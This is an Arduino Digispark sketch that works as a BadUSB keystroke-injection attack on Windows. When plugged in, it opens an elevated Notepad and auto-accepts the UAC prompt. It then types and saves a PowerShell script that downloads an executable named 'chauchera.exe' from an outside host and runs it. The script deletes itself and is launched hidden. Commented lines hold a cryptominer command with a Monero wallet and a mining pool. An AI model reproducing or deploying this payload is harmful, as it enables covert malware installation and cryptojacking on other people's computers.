#define LAYOUT_SPANISH_LATIN_AMERICA
#include "DigiKeyboard.h"

int LED_PIN = 1;
int KEY_DELAY = 1000;

void setup() {
  pinMode(LED_PIN, OUTPUT);
}

void loop() {
  digitalWrite(LED_PIN, HIGH);
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(KEY_DELAY);
  
  // Ejecutar CMD
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_R);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell Start-Process notepad -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.print("(New-Object Net.Webclient).DownloadFile(\"https://90.cl/chauchera.exe\",\"C:\\chauchera.exe\"); Start-Process -FilePath \"C:\\chauchera.exe\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Remove-Item $MyINvocation.InvocationName");
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, KEY_S);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("C:\\config-67060.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_F4);
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_R);
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.print("powershell -windowstyle hidden -File C:\\config-67060.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  digitalWrite(LED_PIN, LOW);

  for(;;){ }

  // Expand-Archive -Force C:\path\to\archive.zip C:\where\to\extract\to
  // Invoke-WebRequest https://github.com/hsgw/plaid/blob/master/doc/img/plaid.jpg -O plaid.jpg
  // .\minerd.exe -a cryptonight -u 458pdQ1HHaVeqx8kY9KktsTiwaeHgN1az6eJ96fadvHw3jwbK3cevM7egz4NctbVUmCKWF1HnqRwJfzqDbeqT8ev7PMTiAJ -p demonio -o stratum+tcp://pool.supportxmr.com:3333
  
}
